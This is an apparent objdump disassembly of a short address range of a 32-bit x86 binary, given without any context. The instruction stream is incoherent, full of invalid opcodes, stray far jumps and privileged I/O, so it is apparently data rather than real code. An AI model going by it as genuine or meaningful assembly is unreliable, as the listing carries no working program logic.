  41b2b8:	push   ds
  41b2b9:	push   ss
  41b2ba:	sbb    al,0x3a
  41b2bc:	add    al,0x4e
  41b2be:	retf   
  41b2bf:	adc    al,0xe5
  41b2c1:	dec    edi
  41b2c2:	mov    edx,0x29d42a0b
  41b2c7:	mov    ds:0x664c5622,al
  41b2cc:	ficom  DWORD PTR cs:[ebp-0x27]
  41b2d0:	test   eax,0x6d867b96
  41b2d5:	rcl    BYTE PTR [eax+0x9],cl
  41b2d8:	push   esi
  41b2d9:	inc    ebp
  41b2da:	xchg   edi,eax
  41b2db:	mov    ds:0x89d4361a,eax
  41b2e0:	call   0x9577:0x6d21865d
  41b2e7:	cld    
  41b2e8:	(bad)  
  41b2ea:	imul   BYTE PTR [ebp+0xb]
  41b2ed:	popf   
  41b2ee:	mov    eax,ds:0x77a9f5dd
  41b2f3:	pusha  
  41b2f4:	push   ss
  41b2f5:	aam    0xff
  41b2f7:	mov    cs,WORD PTR [edi+ecx*8-0x6]
  41b2fb:	cld    
  41b2fc:	push   edx
  41b2fd:	inc    esp
  41b2fe:	xchg   DWORD PTR [eax],esp
  41b300:	pop    ebp
  41b301:	les    eax,FWORD PTR [eax]
  41b303:	xor    bl,bh
  41b305:	dec    ecx
  41b306:	scas   eax,DWORD PTR es:[edi]
  41b307:	sbb    BYTE PTR [eax+ebx*2],bl
  41b30a:	adc    DWORD PTR [esi-0x42],ebx
  41b30d:	popf   
  41b30e:	hlt    
  41b30f:	cdq    
  41b310:	dec    edx
  41b311:	xor    bl,ah
  41b313:	jl     0x41b381
  41b315:	fisttp WORD PTR [ebx-0x7a]
  41b318:	leave  
  41b319:	(bad)  
  41b31a:	jae    0x41b300
  41b31c:	xor    al,0x81
  41b31e:	or     dl,BYTE PTR [edx-0x51835abe]
  41b324:	pop    esi
  41b325:	in     al,dx
  41b326:	dec    edx
  41b327:	jbe    0x41b337
  41b329:	cmc    
  41b32a:	push   ss
  41b32b:	repnz mov ds:0x86b4013b,al
  41b331:	mov    esp,0x1ae0b7e
  41b336:	and    ebp,ebx
  41b338:	xlat   BYTE PTR ds:[ebx]
  41b339:	mov    cl,0xea
  41b33b:	imul   edx,eax,0x30
  41b33e:	fsub   DWORD PTR [ebx+edx*1]
  41b341:	lea    ebx,[eax-0x50]
  41b344:	cdq    
  41b345:	pop    ecx
  41b346:	mov    ah,0xf8
  41b348:	ja     0x41b363
  41b34a:	out    0x9c,eax
  41b34c:	scas   eax,DWORD PTR es:[edi]
  41b34d:	and    BYTE PTR [edi],0x7
  41b350:	retf   0x4294
  41b353:	enter  0x2c5a,0x74
  41b357:	xchg   ebp,eax
  41b358:	fwait
  41b359:	xor    eax,0x3e03672c
  41b35e:	cmp    BYTE PTR [ebx],bh
  41b360:	mov    ds:0x6fbcc62d,eax
  41b365:	into   
  41b366:	mov    al,BYTE PTR [esi+0x6a]
  41b369:	pop    ebp
  41b36a:	stos   DWORD PTR es:[edi],eax
  41b36b:	add    eax,esp
  41b36d:	pop    ds
  41b36e:	inc    edx
  41b36f:	mov    al,0x82
  41b371:	adc    ecx,ebp
  41b373:	cdq    
  41b374:	fidivr WORD PTR [esi]
  41b376:	(bad)  
  41b378:	(bad)  
  41b379:	dec    ebp
  41b37a:	(bad)  
  41b37b:	cmc    
  41b37c:	dec    edx
  41b37d:	push   eax
  41b37e:	out    dx,eax
  41b37f:	fiadd  WORD PTR [ecx]
  41b381:	inc    ecx
  41b382:	or     al,0x99
  41b384:	adc    ah,al
  41b386:	mov    WORD PTR [edi+0x7a14dab],fs
  41b38c:	fist   WORD PTR [edx-0x2f79f3fa]
  41b392:	mov    cl,0x20
  41b394:	iret   
  41b395:	out    0x30,al
  41b397:	aad    0x87
  41b399:	push   edx
  41b39a:	adc    cl,BYTE PTR [ecx]
  41b39c:	cmc    
  41b39d:	sub    edi,DWORD PTR [ebx-0x3e]
  41b3a0:	das    
  41b3a1:	jmp    0xc8ae:0xd51e11ee
  41b3a8:	jecxz  0x41b412
  41b3aa:	sbb    al,0xda
  41b3ac:	cdq    
  41b3ad:	ret    
  41b3ae:	fst    st(0)
  41b3b1:	xor    bh,BYTE PTR [esi-0x5049c844]
  41b3b7:	repz in al,0x6f
  41b3ba:	mov    ch,0x1f
  41b3bc:	sbb    ch,BYTE PTR [edi+0x49598fbf]
  41b3c2:	or     DWORD PTR [ecx-0x78],eax
  41b3c5:	sar    DWORD PTR [ebp+ecx*1+0x3e0d7006],0x8a
  41b3cd:	outs   dx,BYTE PTR ds:[esi]
  41b3ce:	xchg   esp,eax
  41b3cf:	out    0x71,al
  41b3d1:	or     edx,edx
  41b3d3:	test   esp,0xb45ff44c
  41b3d9:	xlat   BYTE PTR ds:[ebx]
  41b3da:	repnz xchg esi,eax
  41b3dc:	stos   BYTE PTR es:[edi],al
  41b3dd:	dec    esp
  41b3de:	repnz pop ecx
  41b3e0:	adc    eax,0x5e793444
  41b3e5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b3e6:	mov    al,ds:0x8f260fa3
  41b3eb:	lods   eax,DWORD PTR ds:[esi]
  41b3ec:	jb     0x41b449
  41b3ee:	lds    ebx,FWORD PTR [edi-0xc]
  41b3f1:	jmp    0x4f67:0x6e30daa8
  41b3f8:	xchg   esi,eax
  41b3f9:	jbe    0x41b3d6
  41b3fb:	rcr    DWORD PTR [esi],cl
  41b3fd:	cmp    DWORD PTR [ebx+0x45],ebp
  41b400:	push   ds
  41b401:	inc    edx
  41b402:	ins    DWORD PTR es:[edi],dx
  41b403:	in     eax,dx
  41b404:	cmp    eax,0x98de745b
  41b409:	(bad)  
  41b40a:	add    bh,dl
  41b40c:	retf   0x9cf3
  41b40f:	(bad)  
  41b410:	sbb    eax,0x19c28d4b
  41b415:	jecxz  0x41b3a6
  41b417:	out    dx,al
  41b418:	sub    eax,0x831bb0e0
  41b41d:	mov    ah,0x82
  41b41f:	add    eax,0x48043372
  41b424:	iret   
  41b425:	into   
  41b426:	popf   
  41b427:	fiadd  DWORD PTR fs:0xe13ab2b
  41b42e:	xor    al,BYTE PTR [esi]
  41b430:	sahf   
  41b431:	ins    BYTE PTR es:[edi],dx
  41b432:	xor    esp,DWORD PTR [ecx+0x30]
  41b435:	in     al,dx
  41b436:	jb     0x41b497
  41b438:	jae    0x41b43f
  41b43a:	dec    ecx
  41b43b:	xchg   BYTE PTR [edi-0x5b922e0e],dl
  41b441:	sub    al,0xa6
  41b443:	cli    
  41b444:	ja     0x41b4b0
  41b446:	sbb    BYTE PTR [ebp+eax*8-0x7260d8e3],0xed
  41b44e:	push   0xffffffd1
  41b450:	sbb    eax,0xf7546af6
  41b455:	fs jge 0x41b476
  41b458:	or     eax,0x30a5b13
  41b45d:	xor    DWORD PTR [edi],eax
  41b45f:	cmp    eax,0xbc6a64ec
  41b464:	shl    dh,cl
  41b466:	cli    
  41b467:	dec    ebp
  41b468:	cwde   
  41b469:	xor    al,0x91
  41b46b:	inc    edx
  41b46c:	and    BYTE PTR [esi+0x2a],dh
  41b46f:	dec    ebx
  41b470:	ss cmc 
  41b472:	or     al,0x90
  41b474:	or     eax,0xce7417f0
  41b479:	xor    eax,0xff8e6c3b
  41b47e:	scas   eax,DWORD PTR es:[edi]
  41b47f:	mov    bl,BYTE PTR [edx-0x6173c486]
  41b485:	aad    0xc4
  41b487:	lods   al,BYTE PTR ds:[esi]
  41b488:	in     eax,0xa7
  41b48a:	or     al,0x2b
  41b48c:	pop    esi
  41b48d:	adc    BYTE PTR [edx],bl
  41b48f:	cmp    al,0x33
  41b491:	inc    edi
  41b492:	cmp    al,0xf
  41b494:	imul   DWORD PTR [edi+esi*4]
  41b497:	cmp    bh,al
  41b499:	int    0x88
  41b49b:	mov    ch,0xf8
  41b49d:	in     al,dx
  41b49e:	pop    ecx
  41b49f:	xor    ah,bh
  41b4a1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b4a2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b4a3:	scas   eax,DWORD PTR es:[edi]
  41b4a4:	cwde   
  41b4a5:	addr16 sub al,0x1a
  41b4a8:	aam    0xa7
  41b4aa:	pop    eax
  41b4ab:	pop    ds
  41b4ac:	dec    edx
  41b4ad:	lds    ecx,FWORD PTR [edi+0x29]
  41b4b0:	xor    al,0x7c
  41b4b2:	mov    al,ds:0xd5f3f673
  41b4b7:	dec    ebx
  41b4b8:	sub    dh,BYTE PTR ds:0x8613cc80
  41b4be:	(bad)  
  41b4bf:	xor    eax,0x7a44bef3
  41b4c4:	retf   
  41b4c5:	xchg   ecx,eax
  41b4c6:	aad    0x98
  41b4c8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b4c9:	js     0x41b4ac
  41b4cb:	aaa    
  41b4cc:	jne    0x41b4d3
  41b4ce:	jle    0x41b4a1
  41b4d0:	popf   
  41b4d1:	cmp    ecx,edi
  41b4d3:	lds    eax,FWORD PTR ds:0x20cf0993
  41b4d9:	jns    0x41b4ba
  41b4db:	icebp  
  41b4dc:	test   eax,0xeb108c8e
  41b4e1:	and    BYTE PTR [esi+eax*2-0x4ab7f007],dh
  41b4e8:	sub    eax,0x6f5bbf38
  41b4ed:	push   edx
  41b4ee:	pop    edi
  41b4ef:	fdivr  QWORD PTR [ebx]
  41b4f1:	(bad)  
  41b4f2:	jle    0x41b48e
  41b4f4:	adc    BYTE PTR [ecx-0x1d],0x8a
  41b4f8:	push   ebx
  41b4f9:	cmp    DWORD PTR [esi+0x3f12cbb6],ebx
  41b4ff:	nop
  41b500:	neg    BYTE PTR [edi]
  41b502:	push   edi
  41b503:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b504:	lock inc edi
  41b506:	das    
  41b507:	jns    0x41b535
  41b509:	shl    BYTE PTR [ebx],0x7f
  41b50c:	jge    0x41b4f1
  41b50e:	mov    eax,0x5d3550e1
  41b513:	jmp    0x9716be59
  41b518:	dec    esp
  41b519:	test   DWORD PTR [ebx+ebx*2+0x78],0xc4d8b325
  41b521:	stc    
  41b522:	pop    ds
  41b523:	cwde   
  41b524:	jmp    0xf4aa:0xcff2e7b
  41b52b:	push   edi
  41b52c:	lods   eax,DWORD PTR ds:[esi]
  41b52d:	inc    ecx
  41b52e:	(bad)
  41b531:	mov    bh,0x53
  41b533:	aas    
  41b534:	pop    esi
  41b535:	sbb    BYTE PTR [eax],ch
  41b537:	ret    0x300
  41b53a:	mov    ds:0x2b7bc169,eax
  41b53f:	test   eax,0x5cd0f1fa
  41b544:	out    0x2,eax
  41b546:	ret    
  41b547:	dec    ebx
  41b548:	fst    DWORD PTR [ecx+ebp*8]
  41b54b:	mov    bl,0x44
  41b54d:	xor    dl,BYTE PTR [ebp-0x431fa809]
  41b553:	push   ds
  41b554:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b555:	repnz sub eax,0xc25c2f80
  41b55b:	lds    ebx,FWORD PTR [edi+0x76]
  41b55e:	pop    edi
  41b55f:	fwait
  41b560:	push   ecx
  41b561:	or     eax,0x466c47fb
  41b566:	xor    al,0x5
  41b568:	scas   al,BYTE PTR es:[edi]
  41b569:	mov    ebp,0xb4929c5b
  41b56e:	cmp    bl,BYTE PTR [edi-0x6f]
  41b571:	or     dh,cl
  41b573:	retf   
  41b574:	cmp    al,BYTE PTR [eax]
  41b576:	pop    esp
  41b577:	fcom   QWORD PTR [ebx]
  41b579:	test   esp,0x35f2c8e5
  41b57f:	ja     0x4b9b3b4e
  41b585:	mov    ch,0xb3
  41b587:	lods   eax,DWORD PTR ds:[esi]
  41b588:	dec    ebx
  41b589:	pop    esi
  41b58a:	jmp    0xdb798a12
  41b58f:	fmul   DWORD PTR [eax+edx*1+0x2961ce27]
  41b596:	xor    DWORD PTR [ebp+0x24],ebp
  41b599:	js     0x41b5d5
  41b59b:	jb     0x41b5d1
  41b59d:	jp     0x41b57f
  41b59f:	xor    dh,BYTE PTR [ebx+eax*2]
  41b5a2:	pop    eax
  41b5a3:	mov    ds:0x44c363ab,eax
  41b5a8:	and    esi,DWORD PTR [edi]
  41b5aa:	and    eax,0x9710bf35
  41b5af:	mov    ecx,0x21f34fe
  41b5b4:	mov    ch,0x5e
  41b5b6:	xchg   ebx,eax
  41b5b7:	sub    esi,ecx
  41b5b9:	xor    DWORD PTR fs:[edi-0x2c237a3a],edi
  41b5c0:	iret   
  41b5c1:	sbb    BYTE PTR [eax],0x30
  41b5c4:	jmp    0xc8bc1fc8
  41b5c9:	jmp    0x71a4:0x1c26c8e5
  41b5d0:	fwait
  41b5d1:	retf   
  41b5d2:	pop    esp
  41b5d3:	outs   dx,BYTE PTR ds:[esi]
  41b5d4:	pop    ebx
  41b5d5:	repnz xor WORD PTR ss:[ebp-0x51],dx
  41b5db:	sbb    eax,DWORD PTR ds:[ebp+0x3]
  41b5df:	and    bl,al
  41b5e1:	dec    edi
  41b5e2:	mov    DWORD PTR ds:[edi-0xb],ecx
  41b5e6:	outs   dx,DWORD PTR ds:[esi]
  41b5e7:	mov    ebx,0x5bd719f1
  41b5ec:	outs   dx,BYTE PTR ds:[esi]
  41b5ed:	xchg   esi,eax
  41b5ee:	mov    esi,0x4b99ff29
  41b5f3:	mov    ds:0x455062a3,eax
  41b5f8:	mov    esp,0xbdb4ee75
  41b5fd:	int3   
  41b5fe:	scas   al,BYTE PTR es:[edi]
  41b5ff:	neg    edi
  41b601:	pushf  
  41b602:	push   ebx
  41b603:	jmp    0x41b607
  41b605:	(bad)  
  41b606:	pop    ebx
  41b607:	dec    edi
  41b608:	sbb    al,0x1b
  41b60a:	sar    DWORD PTR [edi+ebx*8+0x2ff65c09],0x6a
  41b612:	in     eax,0x44
  41b614:	add    DWORD PTR [ebp-0x7b090efc],ebx
  41b61a:	fcom   st(2)
  41b61c:	lahf   
  41b61d:	cdq    
  41b61e:	jmp    0x41b5da
  41b620:	ror    BYTE PTR [edx*4+0x1200917b],0xfb
  41b628:	pushf  
  41b629:	and    edx,DWORD PTR [edx-0x6645cf97]
  41b62f:	xchg   cl,bh
  41b631:	mov    al,0xcf
  41b633:	inc    ebp
  41b634:	dec    ecx
  41b635:	shr    DWORD PTR [esp+edi*8-0x74ad22aa],1
  41b63c:	jecxz  0x41b665
  41b63e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b63f:	cmc    
  41b640:	sub    ecx,DWORD PTR [esi]
  41b642:	pop    ds
  41b643:	arpl   bp,sp
  41b645:	iret   
  41b646:	mov    esp,0xdcf88a60
  41b64b:	inc    eax
  41b64c:	xor    DWORD PTR [ebx+0x4f],0x79fbd24c
  41b653:	mov    ah,0x46
  41b655:	push   edi
  41b656:	mov    ch,0x61
  41b658:	inc    edi
  41b659:	lods   eax,DWORD PTR ds:[esi]
  41b65a:	mov    eax,0x6b9834bd
  41b65f:	add    eax,0x9c1bc2ba
  41b664:	sbb    ah,0x12
  41b667:	popf   
  41b668:	xor    BYTE PTR [edx],dh
  41b66a:	lods   eax,DWORD PTR ds:[esi]
  41b66b:	mov    eax,0x4d68f48a
  41b670:	shl    BYTE PTR [ecx],1
  41b672:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b673:	mov    ds:0x4bf7442a,al
  41b678:	or     ebx,DWORD PTR [ebx+0x5ac42ddb]
  41b67e:	in     eax,dx
  41b67f:	push   ebp
  41b680:	cwde   
  41b681:	fwait
  41b682:	xchg   edi,eax
  41b683:	push   0x7edec88f
  41b688:	xor    eax,DWORD PTR [esi]
  41b68a:	sub    al,0x75
  41b68c:	hlt    
  41b68d:	lods   eax,DWORD PTR ds:[esi]
  41b68e:	leave  
  41b68f:	mov    eax,0x470918ba
  41b694:	ret    
  41b695:	ins    BYTE PTR es:[edi],dx
  41b696:	xchg   ecx,eax
  41b697:	lahf   
  41b698:	rcl    BYTE PTR [bx+0xe],cl
  41b69c:	test   edi,esp
  41b69e:	and    BYTE PTR [edx+0x16],0x40
  41b6a2:	push   esp
  41b6a3:	or     eax,0xdbb8315d
  41b6a8:	sub    ecx,DWORD PTR [ebx]
  41b6aa:	sbb    BYTE PTR [ebx-0x7df0fa93],cl
  41b6b0:	cmp    DWORD PTR [ebx+0x0],esi
  41b6b3:	add    BYTE PTR [ebx+0x7d8bd855],cl
  41b6b9:	cld    
  41b6ba:	jmp    0x41bbcc
  41b6bf:	into   
  41b6c0:	iret   
  41b6c1:	iret   
  41b6c2:	cmp    al,0xcd
  41b6c4:	cmp    al,0xd1
  41b6c6:	shl    edi,1
  41b6c8:	aad    0x3b
  41b6ca:	je     0x41b739
  41b6cc:	stos   BYTE PTR es:[edi],al
  41b6cd:	scas   al,BYTE PTR es:[edi]
  41b6ce:	repz inc eax
  41b6d0:	mov    WORD PTR [edi+0x78],?
  41b6d3:	jae    0x41b751
  41b6d5:	js     0x41b74f
  41b6d7:	es xchg esi,eax
  41b6d9:	mov    bl,0xf2
  41b6db:	fwait
  41b6dc:	nop
  41b6dd:	dec    edi
  41b6de:	mov    eax,0xb8a18027
  41b6e3:	mul    DWORD PTR [eax]
  41b6e5:	xor    esp,DWORD PTR [ebp-0x31]
  41b6e8:	inc    ebx
  41b6e9:	je     0x41b6f4
  41b6eb:	das    
  41b6ec:	out    dx,al
  41b6ed:	aam    0x4e
  41b6ef:	cld    
  41b6f0:	mov    ebp,0x5f04ff67
  41b6f5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b6f6:	fld    DWORD PTR [esi+0x40932755]
  41b6fc:	dec    ebp
  41b6fd:	inc    edx
  41b6fe:	inc    ebx
  41b6ff:	or     BYTE PTR [ebx+0x24],ch
  41b702:	rcl    BYTE PTR ds:[edi-0x29],1
  41b706:	xchg   BYTE PTR ds:0x8af4dfbd,ah
  41b70c:	retf   
  41b70d:	adc    DWORD PTR [edi],0x32
  41b710:	mov    eax,ds:0x55e42cf
  41b715:	test   DWORD PTR ds:0xe600fdf4,ecx
  41b71b:	push   esp
  41b71c:	stos   DWORD PTR es:[edi],eax
  41b71d:	or     BYTE PTR [ebx-0x2],cl
  41b720:	cwde   
  41b721:	xchg   BYTE PTR [edx+0x71],ch
  41b724:	call   0x7dd0:0x211043b1
  41b72b:	sub    edi,DWORD PTR cs:[ecx+0x6a]
  41b72f:	shl    bh,0x85
  41b732:	jmp    FWORD PTR [ebx+0x70]
  41b735:	inc    esp
  41b736:	jo     0x41b715
  41b738:	into   
  41b739:	pop    es
  41b73a:	or     al,0x74
  41b73c:	jno    0x41b6f3
  41b73e:	inc    ecx
  41b73f:	xchg   edi,eax
  41b740:	mov    al,dl
  41b742:	ins    DWORD PTR es:[edi],dx
  41b743:	hlt    
  41b744:	push   esi
  41b745:	in     eax,dx
  41b746:	daa    
  41b747:	add    al,0x2d
  41b749:	inc    eax
  41b74a:	int    0x5
  41b74c:	out    dx,eax
  41b74d:	fwait
  41b74e:	jns    0x41b73a
  41b750:	fs pop esi
  41b752:	xor    ebx,DWORD PTR [esi+0x59]
  41b755:	lock adc BYTE PTR [esi+0x3f4bd85a],dl
  41b75c:	popf   
  41b75d:	fdivr  st(7),st
  41b75f:	ficomp DWORD PTR [esi-0x7a13d0d4]
  41b765:	aaa    
  41b766:	lock jmp 0x374e:0x8c98ca2c
  41b76e:	data16 stc 
  41b770:	clc    
  41b771:	fidiv  DWORD PTR [esi+0x3220a571]
  41b777:	(bad)  
  41b778:	sbb    al,0x45
  41b77a:	and    bl,bh
  41b77c:	pop    esp
  41b77d:	pop    ss
  41b77e:	loope  0x41b72a
  41b780:	sbb    DWORD PTR [edi],0x23ccea8d
  41b786:	mov    DWORD PTR [edi+0x27],edi
  41b789:	into   
  41b78a:	mov    edi,0x35ca072b
  41b78f:	jns    0x41b768
  41b791:	pop    edx
  41b792:	adc    al,0x4f
  41b794:	jne    0x5690f2a0
  41b79a:	test   DWORD PTR [eax],edx
  41b79c:	and    ecx,edx
  41b79e:	sbb    al,cl
  41b7a0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b7a1:	aam    0x4b
  41b7a3:	nop
  41b7a4:	inc    ebp
  41b7a5:	loope  0x41b74d
  41b7a7:	push   edi
  41b7a8:	pop    esi
  41b7a9:	add    eax,0x4b41e554
  41b7ae:	add    esi,DWORD PTR [edx-0x20]
  41b7b1:	jno    0x41b81d
  41b7b3:	(bad)  
  41b7b4:	daa    
  41b7b5:	rcr    DWORD PTR [edx],1
  41b7b7:	sub    DWORD PTR [ebx+ebp*8+0x1d56080c],esp
  41b7be:	loope  0x41b82a
  41b7c0:	inc    ebp
  41b7c1:	loopne 0x41b769
  41b7c3:	rcr    BYTE PTR [eax+0x2a],1
  41b7c6:	pop    es
  41b7c7:	pop    edx
  41b7c8:	fdiv   QWORD PTR [edx+0xf41314f]
  41b7ce:	push   ss
  41b7cf:	xchg   ecx,eax
  41b7d0:	push   esi
  41b7d1:	sbb    DWORD PTR [ebx+0x34],eax
  41b7d4:	clc    
  41b7d5:	aam    0xaa
  41b7d7:	sbb    eax,0x34d44c69
  41b7dc:	dec    ecx
  41b7dd:	pop    esi
  41b7de:	jmp    0xfa9cd054
  41b7e3:	mov    ch,0x3c
  41b7e5:	sahf   
  41b7e6:	push   edx
  41b7e7:	pop    ebp
  41b7e8:	pusha  
  41b7e9:	mov    eax,0x3a11e9e9
  41b7ee:	adc    al,0xea
  41b7f0:	mov    bl,0x69
  41b7f2:	jnp    0x41b83d
  41b7f4:	dec    esi
  41b7f5:	xchg   edi,eax
  41b7f6:	sbb    DWORD PTR [edi+0x1a7276aa],ebp
  41b7fc:	mov    ecx,0x380b1e47
  41b801:	pushf  
  41b802:	cmp    eax,0x3ae22ae9
  41b807:	inc    edi
  41b808:	dec    ebx
  41b809:	jae    0x41b7bf
  41b80b:	add    eax,0xfbdede69
  41b810:	in     al,dx
  41b811:	sbb    BYTE PTR ds:0xf503c6d6,dh
  41b817:	sub    esp,DWORD PTR [ebx+0x60]
  41b81a:	js     0x41b7ec
  41b81c:	mov    ss,WORD PTR [ebx]
  41b81e:	fwait
  41b81f:	retf   0xf1c8
  41b822:	jmp    0xdbbe:0xaf1afc08
  41b829:	inc    edi
  41b82a:	mov    DWORD PTR [ebp-0x28],ecx
  41b82d:	frstor [eax]
  41b82f:	sti    
  41b830:	cmp    al,0x30
  41b832:	jns    0x41b8af
  41b834:	mov    cl,0x61
  41b836:	sub    al,0x1b
  41b838:	stos   DWORD PTR es:[edi],eax
  41b839:	scas   al,BYTE PTR es:[edi]
  41b83a:	lods   eax,DWORD PTR ds:[esi]
  41b83b:	shl    BYTE PTR [edx],0x9f
  41b83e:	mov    dl,0xe3
  41b841:	mov    esp,0x2ee8e0f3
  41b846:	sub    DWORD PTR [esi-0x21],0xffffffd9
  41b84a:	enter  0x4b7e,0xfd
  41b84e:	test   eax,0xa25400c0
  41b853:	sub    al,0xe3
  41b855:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b856:	pop    esi
  41b857:	mov    eax,?
  41b859:	popf   
  41b85a:	xlat   BYTE PTR ds:[ebx]
  41b85b:	mov    bl,0xbc
  41b85d:	cmc    
  41b85e:	dec    ebp
  41b85f:	rol    DWORD PTR [edx+0x5f],1
  41b862:	jmp    0xb77e:0xdc73b1ff
  41b869:	stos   BYTE PTR es:[edi],al
  41b86a:	and    ah,BYTE PTR [ecx-0x419bfd41]
  41b870:	add    al,0x99
  41b872:	mov    dl,0x6b
  41b874:	cmp    eax,0xc6128b09
  41b879:	mov    bl,BYTE PTR [esi+0x1e]
  41b87c:	push   eax
  41b87d:	and    DWORD PTR [esi],esi
  41b87f:	int3   
  41b880:	mov    al,0x1e
  41b882:	hlt    
  41b883:	jae    0x41b8f3
  41b885:	out    0x41,al
  41b887:	mov    bh,0x65
  41b889:	(bad)  
  41b88a:	fbstp  TBYTE PTR [edx-0x4e]
  41b88d:	rcr    DWORD PTR ds:0xb2cceb1c,0xda
  41b894:	popf   
  41b895:	rol    DWORD PTR [ebp+ecx*2-0x1a],cl
  41b899:	push   ecx
  41b89a:	test   BYTE PTR [edi+0x6a],ch
  41b89d:	sar    DWORD PTR [eax+0x17],0xd2
  41b8a1:	stos   BYTE PTR es:[edi],al
  41b8a2:	xlat   BYTE PTR ds:[ebx]
  41b8a3:	les    ebx,FWORD PTR [ebx-0x53f6b0af]
  41b8a9:	mov    eax,0xd77ad4c
  41b8ae:	retf   0x868a
  41b8b1:	sahf   
  41b8b2:	jne    0x41b91b
  41b8b4:	lahf   
  41b8b5:	push   ebp
  41b8b6:	xor    esi,edx
  41b8b8:	inc    ecx
  41b8b9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b8ba:	das    
  41b8bb:	pop    esp
  41b8bc:	cmc    
  41b8bd:	into   
  41b8be:	fsubr  DWORD PTR [ebx]
  41b8c0:	rol    DWORD PTR [eax],cl
  41b8c2:	fdivr  QWORD PTR [ecx]
  41b8c4:	mov    bh,0xf5
  41b8c6:	(bad)  
  41b8c8:	fadd   QWORD PTR [ebx+0x2ab767f6]
  41b8ce:	aam    0xbe
  41b8d0:	dec    esi
  41b8d1:	sbb    esi,DWORD PTR [edx+0x5]
  41b8d4:	mov    eax,DWORD PTR [ebx-0x3a71e1d8]
  41b8da:	scas   al,BYTE PTR es:[edi]
  41b8db:	pop    edi
  41b8dc:	daa    
  41b8dd:	xor    eax,0xad2ca297
  41b8e2:	sbb    ebx,esp
  41b8e4:	jae    0x41b87b
  41b8e6:	vpand  xmm4,xmm2,XMMWORD PTR [edx]
  41b8ea:	push   ss
  41b8eb:	fadd   QWORD PTR [eax]
  41b8ed:	sub    esp,eax
  41b8ef:	ja     0x41b8c3
  41b8f1:	int    0xe9
  41b8f3:	inc    edx
  41b8f4:	fidivr WORD PTR [ecx+0x7fe7b4cb]
  41b8fa:	dec    edi
  41b8fb:	mov    ds:0xae85ae40,eax
  41b900:	xchg   BYTE PTR [edx+0x20288bbf],ch
  41b906:	cmp    ebx,edx
  41b908:	mov    ah,0xe9
  41b90b:	push   ebx
  41b90c:	pop    esp
  41b90d:	cmp    esi,DWORD PTR [edx+0x2a9b4ad3]
  41b913:	dec    eax
  41b914:	jno    0x41b8eb
  41b916:	pop    ss
  41b917:	mov    ds:0x55af2c69,al
  41b91c:	mov    bh,0x40
  41b91e:	xchg   ecx,eax
  41b91f:	iret   
  41b920:	xor    al,0xfa
  41b922:	xchg   esi,eax
  41b923:	push   ebx
  41b924:	jle    0x41b8bd
  41b926:	test   BYTE PTR [ecx-0xf36b2d6],ch
  41b92c:	pop    ds
  41b92d:	adc    DWORD PTR [ebx+0x42bda3ff],edx
  41b933:	adc    edx,edi
  41b935:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b936:	out    dx,al
  41b937:	(bad)  
  41b938:	xlat   BYTE PTR ds:[ebx]
  41b939:	adc    esi,DWORD PTR [ecx+0x9]
  41b93c:	push   0xffffff8b
  41b93e:	dec    edi
  41b93f:	retf   0xb7a7
  41b942:	mov    ah,0xf1
  41b944:	pusha  
  41b945:	or     esi,DWORD PTR [esi]
  41b947:	mov    dl,0x60
  41b949:	sub    dl,cl
  41b94b:	loop   0x41b90d
  41b94d:	test   al,0x8d
  41b94f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b950:	cmp    DWORD PTR [esi-0x62079a13],edi
  41b956:	in     eax,0x80
  41b958:	adc    ch,BYTE PTR [edi*1+0x651d0f00]
  41b95f:	mov    ah,0x6a
  41b961:	pop    ebp
  41b962:	push   0xff558d0
  41b967:	clc    
  41b968:	mov    ecx,0xf2820e67
  41b96d:	cwde   
  41b96e:	pop    ss
  41b96f:	dec    ebp
  41b970:	sub    ebx,ebx
  41b972:	mov    edx,fs
  41b974:	xchg   DWORD PTR [edi+0x1c],edx
  41b977:	xchg   edi,eax
  41b978:	in     al,0x13
  41b97a:	or     ch,bh
  41b97c:	(bad)  
  41b97d:	int    0x66
  41b97f:	into   
  41b980:	xchg   cl,dl
  41b982:	in     eax,0x39
  41b984:	shl    DWORD PTR [ebx-0x2f],0x82
  41b988:	and    ebp,ebx
  41b98a:	pusha  
  41b98b:	and    BYTE PTR [edi],bl
  41b98d:	pop    esp
  41b98e:	test   al,0x64
  41b990:	fiadd  DWORD PTR [edx+0x40]
  41b993:	xchg   esp,eax
  41b994:	lahf   
  41b995:	fld    TBYTE PTR [ebx-0x6c]
  41b998:	daa    
  41b999:	call   0x6d1cc3eb
  41b99e:	dec    esp
  41b99f:	scas   al,BYTE PTR es:[edi]
  41b9a0:	adc    BYTE PTR [ebx+0x43],0x9
  41b9a4:	mov    gs,edx
  41b9a6:	mov    esi,0x10b0c438
  41b9ab:	inc    ebp
  41b9ac:	fcom   QWORD PTR [edi]
  41b9ae:	add    eax,0x4e752e0e
  41b9b3:	out    0x15,al
  41b9b5:	leave  
  41b9b6:	ror    DWORD PTR [ebx+0x43],cl
  41b9b9:	mov    WORD PTR [edx+0x12],ds
  41b9bc:	mov    eax,0x5d637035
  41b9c1:	sbb    DWORD PTR [edx+eax*1+0x972a6b],0xffffffda
  41b9c9:	mov    fs,esi
  41b9cb:	sub    al,0x3
  41b9cd:	lahf   
  41b9ce:	dec    ecx
  41b9cf:	(bad)  
  41b9d0:	addr16 adc eax,0xba163096
  41b9d6:	add    BYTE PTR [ebx+0xe],al
  41b9d9:	jmp    0x41b9d0
  41b9db:	std    
  41b9dc:	lahf   
  41b9dd:	or     eax,0x3be93ec9
  41b9e2:	or     eax,0x98408af7
  41b9e7:	push   es
  41b9e8:	aam    0xe7
  41b9ea:	cmp    edx,DWORD PTR [esi+esi*8]
  41b9ed:	xchg   edi,eax
  41b9ee:	(bad)
  41b9f1:	test   DWORD PTR [edx],esi
